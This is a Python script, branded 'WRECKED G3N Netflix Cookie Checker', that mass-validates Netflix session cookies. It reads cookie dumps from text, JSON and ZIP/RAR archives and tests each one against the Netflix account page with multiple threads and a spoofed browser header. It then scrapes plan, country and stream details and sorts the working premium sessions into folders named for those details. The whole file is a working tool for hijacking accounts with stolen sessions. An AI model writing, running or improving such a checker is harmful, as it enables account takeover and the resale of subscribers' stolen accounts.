import requests
import os
import threading
import colorama
import shutil
import re
import json
import time
import traceback
import zipfile
import rarfile
from datetime import datetime

# Global counters
total_working = 0
total_fails = 0
total_unsubscribed = 0
total_checked = 0
total_broken = 0
lock = threading.Lock()

# Global paths
working_cookies_dir = "working_cookies"
temp_dir = "temp"
MAX_RECURSION_DEPTH = 5  # Prevent infinite recursion
dirs = {
    "netflix": {
        "root": "netflix", 
        "hits": "working_cookies/netflix/premium",
        "failures": "working_cookies/netflix/failures", 
        "broken": "working_cookies/netflix/broken",
        "free": "working_cookies/netflix/free"
    }
}

def debug_print(message):
    """Print debug messages with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")

def setup_directories():
    """Setup all required directories"""
    for service in dirs.values():
        for directory in service.values():
            os.makedirs(directory, exist_ok=True)
    
    # Create base working cookies directory if it doesn't exist
    os.makedirs(working_cookies_dir, exist_ok=True)
    
    # Create temporary extraction directory for archives
    os.makedirs(os.path.join(temp_dir, "netflix", "extracted"), exist_ok=True)

def print_banner():
    """Print the Netflix cookie checker banner"""
    print(colorama.Fore.RED + """
███╗░░██╗███████╗████████╗███████╗██╗░░░░░██╗██╗░░██╗  ░█████╗░░█████╗░░█████╗░██╗░░██╗██╗███████╗
████╗░██║██╔════╝╚══██╔══╝██╔════╝██║░░░░░██║╚██╗██╔╝  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║██╔════╝
██╔██╗██║█████╗░░░░░██║░░░█████╗░░██║░░░░░██║░╚███╔╝░  ██║░░╚═╝██║░░██║██║░░██║█████═╝░██║█████╗░░
██║╚████║██╔══╝░░░░░██║░░░██╔══╝░░██║░░░░░██║░██╔██╗░  ██║░░██╗██║░░██║██║░░██║██╔═██╗░██║██╔══╝░░
██║░╚███║███████╗░░░██║░░░██║░░░░░███████╗██║██╔╝╚██╗  ╚█████╔╝╚█████╔╝╚█████╔╝██║░╚██╗██║███████╗
╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝╚═╝░░╚═╝  ░╚════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚══════╝
               
                   ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
                   ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
                   ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
                   ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
                   ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
                   ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝                      
                                   
                            WRECKED G3N Netflix Cookie Checker
                                                                       
    """ + colorama.Fore.RESET)
    print("---------------------------------------------------------------------------------------------")

def convert_to_netscape_format(cookie):
    """Convert the cookie dictionary to the Netscape cookie format string"""
    try:
        return "{}\t{}\t{}\t{}\t{}\t{}\t{}".format(
            cookie.get('domain', '.netflix.com'), 
            'TRUE' if cookie.get('flag', 'TRUE').upper() == 'TRUE' else 'FALSE', 
            cookie.get('path', '/'),
            'TRUE' if cookie.get('secure', True) else 'FALSE', 
            cookie.get('expiration', str(int(time.time()) + 86400)), 
            cookie.get('name', ''), 
            cookie.get('value', '')
        )
    except Exception as e:
        debug_print(f"Error converting cookie to Netscape format: {e}")
        return None

def process_json_files(directory):
    """Process JSON files and convert them to Netscape format"""
    json_after_conversion_folder = os.path.join(directory, "json_cookies_after_conversion")
    os.makedirs(json_after_conversion_folder, exist_ok=True)
    
    json_files = [f for f in os.listdir(directory) if f.endswith(".json")]
    debug_print(f"Found {len(json_files)} JSON files to convert in {directory}")
    
    for filename in json_files:
        file_path = os.path.join(directory, filename)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                try:
                    cookies = json.load(file)
                    if isinstance(cookies, list) and cookies:
                        if 'domain' in cookies[0]:
                            netscape_cookie_file = os.path.join(directory, filename.replace('.json', '.txt'))
                            valid_lines = []
                            for cookie in cookies:
                                line = convert_to_netscape_format(cookie)
                                if line:
                                    valid_lines.append(line + '\n')
                            
                            if valid_lines:
                                with open(netscape_cookie_file, 'w', encoding='utf-8') as outfile:
                                    outfile.writelines(valid_lines)
                                debug_print(f"Converted {filename} to Netscape format")
                                shutil.move(file_path, os.path.join(json_after_conversion_folder, filename))
                except json.JSONDecodeError:
                    debug_print(f"Error decoding JSON from file {filename}")
        except Exception as e:
            debug_print(f"Error processing JSON file {filename}: {e}")

def load_cookies_from_file(cookie_file):
    """Load cookies from a given file and return a dictionary of cookies."""
    global total_broken
    cookies = {}
    try:
        with open(cookie_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                # Skip comment lines and empty lines
                if line.strip() and not line.strip().startswith('#'):
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        domain, _, path, secure, expires, name, value = parts[:7]
                        cookies[name] = value
                    elif '=' in line:  # Try to handle key=value format
                        for pair in line.split(';'):
                            pair = pair.strip()
                            if '=' in pair:
                                name, value = pair.split('=', 1)
                                cookies[name.strip()] = value.strip().strip('"')
    except Exception as e:
        debug_print(f"Error loading cookies from {cookie_file}: {str(e)}")
        broken_folder = dirs["netflix"]["broken"]
        if os.path.exists(cookie_file):
            shutil.move(cookie_file, os.path.join(broken_folder, os.path.basename(cookie_file)))
        with lock:
            total_broken += 1
    
    return cookies

def make_request_with_cookies(cookies):
    """Make an HTTP request to Netflix using provided cookies."""
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://www.netflix.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"'
    }
    
    try:
        response = session.get("https://www.netflix.com/YourAccount", headers=headers, timeout=10)
        return response.text
    except requests.exceptions.RequestException as e:
        debug_print(f"Request error: {str(e)}")
        return ""

def extract_info(response_text):
    """Extract relevant information from the Netflix account page."""
    patterns = {
        'countryOfSignup': r'"countryOfSignup":\s*"([^"]+)"',
        'memberSince': r'"memberSince":\s*"([^"]+)"',
        'userGuid': r'"userGuid":\s*"([^"]+)"',
        'showExtraMemberSection': r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
        'membershipStatus': r'"membershipStatus":\s*"([^"]+)"',
        'maxStreams': r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),',
        'localizedPlanName': r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)\"'
    }
    
    extracted_info = {}
    for key, pattern in patterns.items():
        match = re.search(pattern, response_text)
        extracted_info[key] = match.group(1) if match else None
    
    # Additional processing for special fields
    if extracted_info['localizedPlanName']:
        extracted_info['localizedPlanName'] = extracted_info['localizedPlanName'].replace('x28', '').replace('\\', ' ').replace('x20', '').replace('x29', '')
    
    if extracted_info['memberSince']:
        extracted_info['memberSince'] = extracted_info['memberSince'].replace("\\x20", " ")
    
    if extracted_info['showExtraMemberSection']:
        extracted_info['showExtraMemberSection'] = extracted_info['showExtraMemberSection'].capitalize()
    
    # Check if we have critical fields
    if not extracted_info['countryOfSignup'] or extracted_info['countryOfSignup'] == "null":
        raise ValueError("Could not extract country of signup, likely not a valid login")
    
    return extracted_info

def handle_successful_login(cookie_file, info, is_subscribed):
    """Handle the actions required after a successful Netflix login."""
    global total_working, total_unsubscribed
    
    if not is_subscribed:
        with lock:
            total_unsubscribed += 1
        debug_print(f"Login successful with {cookie_file}, but not subscribed. Moving to free folder.")
        free_folder = dirs["netflix"]["free"]
        shutil.move(cookie_file, os.path.join(free_folder, os.path.basename(cookie_file)))
        return
    
    with lock:
        total_working += 1
    debug_print(f"Login successful with {cookie_file} - Country: {info['countryOfSignup']}, Member since: {info['memberSince']}")
    
    # Create a meaningful filename
    new_filename = f"{info['countryOfSignup']}_{info.get('localizedPlanName', 'Unknown').replace(' ', '_')}_{info.get('showExtraMemberSection', 'unknown')}_{os.path.basename(cookie_file)}"
    hits_folder = dirs["netflix"]["hits"]
    new_filepath = os.path.join(hits_folder, new_filename)
    
    # Read the original cookie content
    with open(cookie_file, 'r', encoding='utf-8', errors='ignore') as infile:
        original_cookie_content = infile.read()
    
    # Fix various naming and formatting issues
    plan_name = info.get('localizedPlanName', 'Unknown').replace("miembro u00A0extra", "(Extra Member)")
    member_since = info.get('memberSince', 'Unknown').replace("\x20", " ")
    max_streams = info.get('maxStreams', 'Unknown')
    if max_streams:
        max_streams = max_streams.rstrip('}')
    
    # Convert boolean to Yes/No
    extra_members = "Yes" if info.get('showExtraMemberSection') == "True" else "No" if info.get('showExtraMemberSection') == "False" else "Unknown"
    
    # Write to the new file with cookie details
    with open(new_filepath, 'w', encoding='utf-8') as outfile:
        outfile.write(f"PLAN: {plan_name}\n")
        outfile.write(f"COUNTRY: {info['countryOfSignup']}\n")
        outfile.write(f"MAX STREAMS: {max_streams}\n")
        outfile.write(f"EXTRA MEMBERS: {extra_members}\n")
        outfile.write(f"MEMBER SINCE: {member_since}\n")
        outfile.write(f"CHECKED ON: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        outfile.write("\n\n")
        outfile.write(original_cookie_content)
    
    # Remove the original file after successful processing
    if os.path.exists(cookie_file):
        os.remove(cookie_file)

    return {
        "plan": plan_name,
        "country": info['countryOfSignup'],
        "max_streams": max_streams,
        "extra_members": extra_members,
        "member_since": member_since
    }

def handle_failed_login(cookie_file):
    """Handle the actions required after a failed Netflix login."""
    global total_fails
    with lock:
        total_fails += 1
    
    debug_print(f"Login failed with {cookie_file}. Cookie expired or invalid.")
    failures_folder = dirs["netflix"]["failures"]
    if os.path.exists(cookie_file):
        shutil.move(cookie_file, os.path.join(failures_folder, os.path.basename(cookie_file)))

def process_cookie_file(cookie_file):
    """Process a single Netflix cookie file to check validity."""
    global total_checked, total_broken
    with lock:
        total_checked += 1
    
    result = {
        "valid": False,
        "details": None,
        "file": os.path.basename(cookie_file)
    }
    
    try:
        debug_print(f"Processing {cookie_file}")
        cookies = load_cookies_from_file(cookie_file)
        
        if not cookies:
            debug_print(f"No valid cookies found in {cookie_file}")
            broken_folder = dirs["netflix"]["broken"]
            if os.path.exists(cookie_file):
                shutil.move(cookie_file, os.path.join(broken_folder, os.path.basename(cookie_file)))
            with lock:
                total_broken += 1
            return result
        
        response_text = make_request_with_cookies(cookies)
        
        if not response_text:
            debug_print(f"Empty response for {cookie_file}")
            handle_failed_login(cookie_file)
            return result
        
        info = extract_info(response_text)
        is_subscribed = info.get('membershipStatus') == "CURRENT_MEMBER"
        
        if info.get('countryOfSignup') and info.get('countryOfSignup') != "null":
            details = handle_successful_login(cookie_file, info, is_subscribed)
            if is_subscribed:
                result["valid"] = True
                result["details"] = details
            return result
        else:
            handle_failed_login(cookie_file)
            return result
    except Exception as e:
        debug_print(f"Error processing {cookie_file}: {str(e)}")
        debug_print(traceback.format_exc())
        broken_folder = dirs["netflix"]["broken"]
        if os.path.exists(cookie_file):
            shutil.move(cookie_file, os.path.join(broken_folder, os.path.basename(cookie_file)))
        with lock:
            total_broken += 1
        return result

def worker(cookie_files, results):
    """Worker thread to process Netflix cookie files."""
    while cookie_files:
        try:
            cookie_file = cookie_files.pop(0)
            result = process_cookie_file(cookie_file)
            results.append(result)
        except Exception as e:
            debug_print(f"Worker error: {str(e)}")

def extract_from_archive(archive_path, extract_dir):
    """Extract files from a ZIP or RAR archive."""
    try:
        debug_print(f"Extracting archive: {archive_path} to {extract_dir}")
        file_ext = os.path.splitext(archive_path)[1].lower()
        
        if file_ext == '.zip':
            debug_print("Processing ZIP file")
            try:
                with zipfile.ZipFile(archive_path, 'r') as zip_ref:
                    # List all files in the archive
                    file_list = zip_ref.namelist()
                    debug_print(f"ZIP contains {len(file_list)} files/directories")
                    
                    # Extract the files
                    zip_ref.extractall(extract_dir)
                debug_print("ZIP extraction successful")
                return True
            except zipfile.BadZipFile as e:
                debug_print(f"Bad ZIP file: {e}")
                return False
                
        elif file_ext == '.rar':
            debug_print("Processing RAR file")
            try:
                with rarfile.RarFile(archive_path) as rar_ref:
                    # List all files in the archive
                    file_list = rar_ref.namelist()
                    debug_print(f"RAR contains {len(file_list)} files/directories")
                    
                    # Extract the files
                    rar_ref.extractall(extract_dir)
                debug_print("RAR extraction successful")
                return True
            except Exception as e:
                debug_print(f"Error with RAR file: {e}")
                # Create a note file about RAR extraction issues
                rar_note_path = os.path.join(extract_dir, "RAR_EXTRACTION_NOTE.txt")
                with open(rar_note_path, 'w') as f:
                    f.write(f"Error extracting RAR file: {e}\n")
                    f.write("If extraction fails, please extract manually and upload .txt files instead.\n")
                return False
        else:
            debug_print(f"Unsupported archive format: {file_ext}")
            return False
    except Exception as e:
        debug_print(f"Error extracting archive {archive_path}: {e}")
        return False

def process_directory(directory, processed_files=None):
    """Process a directory recursively for cookie files and archives."""
    if processed_files is None:
        processed_files = []
    
    debug_print(f"Processing directory: {directory}")
    cookie_files = []
    
    # Walk through all files and subdirectories
    for root, dirs, files in os.walk(directory):
        debug_print(f"Scanning {root}: found {len(files)} files and {len(dirs)} directories")
        
        for file in files:
            file_path = os.path.join(root, file)
            
            # Skip if already processed
            if file_path in processed_files:
                debug_print(f"Skipping already processed file: {file_path}")
                continue
            
            # Add to processed files
            processed_files.append(file_path)
            
            # Check file extension
            file_ext = os.path.splitext(file)[1].lower()
            
            # Process archives
            if file_ext in ['.zip', '.rar']:
                debug_print(f"Found archive: {file_path}")
                
                # Create extraction directory
                extract_dir = os.path.join(directory, f"extracted_{os.path.splitext(file)[0]}")
                os.makedirs(extract_dir, exist_ok=True)
                
                # Extract archive
                if extract_from_archive(file_path, extract_dir):
                    # Process extracted files
                    additional_files = process_directory(extract_dir, processed_files)
                    cookie_files.extend(additional_files)
                    
                    # We don't delete the extraction directory here to avoid issues with
                    # files that might still be in use
            
            # Process txt files
            elif file_ext == '.txt':
                debug_print(f"Found cookie file: {file_path}")
                cookie_files.append(file_path)
    
    return cookie_files

def check_netflix_cookies(cookies_dir="netflix", num_threads=3):
    """Check all Netflix cookies in the specified directory."""
    global total_working, total_fails, total_unsubscribed, total_checked, total_broken
    total_working = total_fails = total_unsubscribed = total_checked = total_broken = 0
    
    # Setup directories
    setup_directories()
    
    # Convert any JSON cookies to Netscape format
    process_json_files(cookies_dir)
    
    # Process the directory recursively to find all cookie files including in archives
    cookie_files = process_directory(cookies_dir)
    
    debug_print(f"Found {len(cookie_files)} Netflix cookie files to check")
    
    if not cookie_files:
        debug_print("No cookie files found.")
        return []
    
    # Process cookies with multiple threads
    results = []
    threads = []
    
    # Divide cookies among threads
    for i in range(min(num_threads, len(cookie_files))):
        thread_cookies = cookie_files[i::num_threads]
        thread = threading.Thread(target=worker, args=(thread_cookies, results))
        threads.append(thread)
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    # Print statistics
    print_statistics()
    
    return results

def print_statistics():
    """Print statistics of the Netflix cookie checking process."""
    debug_print("\n--- Netflix Cookie Check Statistics ---")
    debug_print(f"Total checked: {total_checked}")
    debug_print(f"Working cookies: {total_working}")
    debug_print(f"Unsubscribed accounts: {total_unsubscribed}")
    debug_print(f"Failed cookies: {total_fails}")
    debug_print(f"Broken cookies: {total_broken}")
    debug_print("-------------------------------------\n")

def check_cookie(cookie_content):
    """Check a single Netflix cookie string."""
    # Create a temporary file for the cookie
    temp_dir = os.path.join("temp", "netflix")
    os.makedirs(temp_dir, exist_ok=True)
    
    temp_file = os.path.join(temp_dir, f"temp_cookie_{int(time.time())}.txt")
    
    try:
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(cookie_content)
        
        result = process_cookie_file(temp_file)
        return result
    except Exception as e:
        debug_print(f"Error checking single cookie: {str(e)}")
        if os.path.exists(temp_file):
            os.remove(temp_file)
        return {"valid": False, "details": None, "file": "temp_cookie.txt"}

# Main function to run when script is executed directly
if __name__ == "__main__":
    colorama.init()
    print_banner()
    
    import sys
    
    # Check if a specific file path was provided as an argument
    if len(sys.argv) > 1:
        filepath = sys.argv[1]
        if os.path.isfile(filepath):
            # Setup directories
            setup_directories()
            
            # If checking a single file
            debug_print(f"Checking single cookie file: {filepath}")
            
            # Process the single file and get the result
            result = process_cookie_file(filepath)
            
            # Print statistics
            print_statistics()
        else:
            # If it's a directory, check all files in it
            check_netflix_cookies(filepath)
    else:
        # Default behavior with no arguments - check netflix directory
        check_netflix_cookies()